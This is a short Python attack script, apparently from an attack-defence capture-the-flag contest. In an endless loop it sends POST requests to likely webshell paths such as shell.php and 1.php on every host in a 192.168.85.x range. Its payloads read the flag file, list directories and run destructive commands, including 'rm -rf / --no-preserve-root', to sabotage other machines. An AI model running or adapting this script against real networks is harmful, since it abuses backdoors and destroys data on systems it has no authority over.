import requests
import time

def scan_attack():
    file={'shell.php','admin.php','web.php','login.php','1.php','index.php'}
    payload={'cat /flag','ls -al','rm -f','echo 1','echo 1 /proc/sys/net/ipv4/ip_forward','rm -rf / --no-preserve-root'}
    while(1):
        for i in range(1, 50):
            for ii in file:
                url='http://192.168.85.'+ str(i)+'/'+ii
                print(url)
                for iii in payload:
                    data={
                        'payload':iii
                    }
                    try:
                        requests.post(url,data=data)
                        print("正在搅屎:"+str(i)+'|'+ii+'|'+iii)
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(0.1)
                        pass


if __name__ == '__main__':
    scan_attack()